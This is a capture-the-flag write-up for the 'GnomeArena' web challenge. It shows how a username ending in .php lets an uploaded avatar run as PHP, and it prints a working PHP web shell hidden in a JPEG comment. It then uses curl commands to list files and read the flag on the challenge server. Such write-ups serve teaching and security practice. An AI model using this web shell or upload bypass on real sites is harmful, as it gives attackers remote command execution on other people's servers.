# GnomeArena: Rock Paper Scissors
Web

## Challenge 

	This new website is all the rage for every gnome in Lapland! How many games of Rock Paper Scissors can you win?

	Server: http://199.247.6.180:12002

	Author: Milkdrop

## Solution

When in the setting pane, we see that we can change the username. http://199.247.6.180:12002/settings.php

If we change to a empty name, this error pops up

	Warning: rename(avatars/Helloworld,avatars/): Not a directory in /var/www/html/settings.php on line 35

Note that the image is taken from this file
	
	http://199.247.6.180:12002/avatars/<username>

Since they allow dots in the username, let's try a PHP format `derp.php`... And it works

	Current Name: derp.php

### File upload vulnerability

We can only upload JPG files. However, the file can be parsed as a PHP since we can change the username to end with .php

Now, this is a typical file upload vulnerability. So let's try to upload a JPG with a hidden PHP code.

I shall follow the [instructions on this page](https://phocean.net/2013/09/29/file-upload-vulnerabilities-appending-php-code-to-an-image.html
). This creates a page where we can do a `GET` request with the `cmd` parameter.

	# delete extra headers
	$ jhead -purejpg test.jpg 

	# Edit EXIF JPEG comment
	$ jhead -ce test.jpg 
	
	<style>body{font-size: 0;}h1{font-size: 12px}</style><h1><?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo '<img src="./clean_image.jpg" border=0>';}__halt_compiler();?></h1>

And now we can do system commands using this

	$ curl http://199.247.6.180:12002/avatars/derp.php?cmd='ls -la'
	????JFIFdd???<style>body{font-size: 0;}h1{font-size: 12px}</style><h1>total 57800
	drwxrwxrwx    1 nginx    nginx         4096 Dec 17 04:31 .
	dr-xr-xr-x    1 nginx    nginx         4096 Dec 13 19:00 ..
	-rw-r--r--    1 nginx    nginx       467938 Dec 17 03:45 0
	-rw-r--r--    1 nginx    nginx        11398 Dec 17 04:04 1
	-rw-r--r--    1 nginx    nginx        11398 Dec 17 04:20 12
	-rw-r--r--    1 nginx    nginx         5082 Dec 17 00:13 12.php
	-rw-r--r--    1 nginx    nginx      6932349 Dec 16 22:49 1547
	-rw-r--r--    1 nginx    nginx          230 Dec 17 04:30 789789
	-rw-r--r--    1 nginx    nginx     28635986 Dec 17 00:59 ADMIN
	-rw-r--r--    1 nginx    nginx        58515 Dec 17 00:04 Alamos
	<...>

After which, we can traverse up
	
	$ curl http://199.247.6.180:12002/avatars/derp.php?cmd='ls ../'
	????JFIFdd???<style>body{font-size: 0;}h1{font-size: 12px}</style><h1>500.html
	avatars
	engine.php
	flag.txt
	header.html
	img
	index.php
	logo_bg.jpg
	settings.php

Found the flag

	$ curl http://199.247.6.180:12002/avatars/derp.php?cmd='cat ../flag.txt'
	????JFIFdd???<style>body{font-size: 0;}h1{font-size: 12px}</style><h1>
	X-MAS{Ev3ry0ne_m0ve_aw4y_th3_h4ck3r_gn0m3_1s_1n_t0wn}


## Flag

	X-MAS{Ev3ry0ne_m0ve_aw4y_th3_h4ck3r_gn0m3_1s_1n_t0wn}
